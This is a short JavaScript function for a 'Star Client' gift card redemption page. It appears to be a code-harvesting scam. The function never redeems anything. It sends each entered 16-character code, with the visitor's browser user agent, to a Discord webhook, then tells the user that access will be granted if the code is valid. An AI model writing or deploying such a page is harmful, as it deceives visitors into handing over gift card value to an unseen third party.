const WEBHOOK_URL = "PUT_YOUR_DISCORD_WEBHOOK_URL_HERE";

function redeemCode() {
  const code = document.getElementById("redeemCode").value.trim().toUpperCase();
  const status = document.getElementById("redeemStatus");

  const regex = /^[A-Z0-9]{16}$/;

  if (!regex.test(code)) {
    status.style.color = "red";
    status.textContent = "Invalid gift card code.";
    return;
  }

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "🎁 Star Client | Gift Card Redeemed",
        color: 0x57F287,
        fields: [
          { name: "Gift Card Code", value: code },
          { name: "Action", value: "Redeem Page" },
          { name: "Device", value: navigator.userAgent }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  status.style.color = "#57F287";
  status.textContent = "Gift card submitted. If valid, access will be granted.";
  document.getElementById("redeemCode").value = "";
}
